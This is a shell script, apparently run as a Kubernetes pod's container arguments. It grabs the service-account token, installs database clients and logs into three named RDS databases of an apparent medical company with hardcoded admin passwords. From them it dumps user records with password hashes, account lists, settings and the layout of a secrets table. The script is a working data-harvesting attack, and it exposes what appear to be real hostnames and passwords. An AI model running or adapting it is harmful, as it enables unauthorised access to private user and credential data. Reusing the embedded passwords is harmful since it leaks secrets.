containers.name: probe
args:
#!/bin/sh
set -u
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token); API=https://kubernetes.default.svc
echo "===I3560C_START utc=$(date -u +%FT%TZ)==="
apk add --no-cache aws-cli jq postgresql16-client mariadb-client >/tmp/apk.log 2>&1
pgq(){ PGHOST="$1" PGUSER=postgres_admin PGDATABASE="$2" PGPASSWORD="$3" PGCONNECT_TIMEOUT=8 PGSSLMODE=require psql -At -c "$4" 2>&1; }
H1=lazamedical-dp-dev01-usw2-postgresql-rds1.c96aqiuye5yb.us-west-2.rds.amazonaws.com
echo "###PHASE_MLFLOWAUTH"
pgq "$H1" mlflow_auth 'qdRd#3DI-YDcV35!' "select username||' | '||coalesce(password_hash,'')||' | admin='||is_admin||' | svc='||is_service_account from public.users limit 50" | head -c 4000
echo
echo "---GATEWAY_SECRETS_SCHEMA"
pgq "$H1" mlflow_auth 'qdRd#3DI-YDcV35!' "select table_name||':'||column_name from information_schema.columns where table_schema='public' and table_name like 'gateway_secret%' order by table_name,ordinal_position" | tr '\n' ' ' | head -c 1500
echo
echo "---MLFLOW_DB_TABLES"
pgq "$H1" mlflow_service 'qdRd#3DI-YDcV35!' "select table_name from information_schema.tables where table_schema='public' order by 1" | tr '\n' ' ' | head -c 1500
echo
echo "###PHASE_RDS2"
H2=lazamedical-dev01-usw2-postgresql-rds2.c96aqiuye5yb.us-west-2.rds.amazonaws.com
pgq "$H2" user_management '$nL7(,wG0S4S$snAS((Ye=rXkr+jS4%g' "select nspname from pg_namespace where nspname not like 'pg_%' and nspname<>'information_schema'" | tr '\n' ' ' | head -c 500
echo
pgq "$H2" user_management '$nL7(,wG0S4S$snAS((Ye=rXkr+jS4%g' "select table_schema||'.'||table_name from information_schema.tables where table_schema not in ('pg_catalog','information_schema') limit 60" | tr '\n' ' ' | head -c 2000
echo
pgq "$H2" postgres '$nL7(,wG0S4S$snAS((Ye=rXkr+jS4%g' "select datname from pg_database" | tr '\n' ' ' | head -c 600
echo
echo "###PHASE_MY3"
export MYSQL_PWD='`a`56PJ>)Wy=^e_9j,o}#,U%rw6Gvv`('
MH=lazamedical-dev01-usw2-mysql-rds1.c96aqiuye5yb.us-west-2.rds.amazonaws.com
mysql --connect-timeout=10 -h "$MH" -u admin -D user_management -N -e "SHOW COLUMNS FROM user" 2>&1 | head -c 900
echo
mysql --connect-timeout=10 -h "$MH" -u admin -D user_management -N -e "SELECT id,username,status,account_id,created_on FROM user LIMIT 50" 2>&1 | head -c 2500
echo
mysql --connect-timeout=10 -h "$MH" -u admin -D user_management -N -e "SELECT * FROM settings LIMIT 20" 2>&1 | head -c 1500
echo
mysql --connect-timeout=10 -h "$MH" -u admin -N -e "SHOW DATABASES" 2>&1 | tr '\n' ' ' | head -c 500
unset MYSQL_PWD
echo
echo "===I3560C_DONE utc=$(date -u +%FT%TZ)==="
